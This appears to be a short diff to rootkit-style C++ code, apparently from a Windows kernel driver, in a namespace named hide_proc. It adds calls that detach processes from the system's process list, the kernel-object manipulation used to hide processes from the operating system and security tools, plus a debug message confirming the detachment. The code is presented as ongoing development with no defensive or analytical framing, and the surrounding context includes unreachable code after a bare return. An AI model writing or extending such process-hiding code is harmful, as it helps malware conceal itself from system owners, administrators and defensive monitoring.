@@ -155,6 +155,7 @@ namespace hide_proc
 				if (GetIndexInHiddenProcIdList(cur_proc.GetPid()) != -1)
 				{
 					AddProcIdToHideList(cur_proc.GetPid());
+					cur_proc.DetachFromProcessList();
 				}
 			}
 
@@ -186,6 +187,10 @@ namespace hide_proc
 			size_t index = GetIndexInHiddenProcIdList(pid);
 			AddPeprocessToHideList(eprocess);
 			(*kHideProcIdList)[(*kHideProcIdList).Size() - 1].DetachFromProcessList();
+			if ((*kHideProcIdList)[(*kHideProcIdList).Size() - 1].IsDetached())
+			{
+				DebugMessage("Detached!");
+			}
 			return;
 			index = GetIndexInHiddenProcImageList(&process_image_name);
 			if (index != -1)
